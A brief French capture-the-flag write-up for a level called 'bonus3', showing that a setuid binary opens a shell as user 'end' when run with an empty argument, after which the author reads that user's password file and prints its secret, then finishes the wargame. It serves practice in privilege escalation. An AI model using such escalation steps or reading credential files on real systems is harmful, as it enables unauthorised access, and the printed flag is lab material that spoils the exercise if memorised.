# bonus3

Binaire setuid

    -rwsr-s---+ 1 end users 5595 bonus3

Pas de désassemblage fait cette fois (pas de `disas main` dans la session), donc pas d'explication précise du mécanisme interne — juste le constat empirique : les arguments normaux ne font rien, mais un argument **vide** déclenche un shell direct :

    ./bonus3            # rien
    ./bonus3 bla        # rien
    ./bonus3 bla bla    # rien
    ./bonus3 ""         # shell direct, uid `end`

    $ whoami
    end
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c

**Dernière étape : `end`**

    su end
    ls -l
    -rwsr-s---+ 1 end users 26 end

    cat end
    Congratulations graduate!

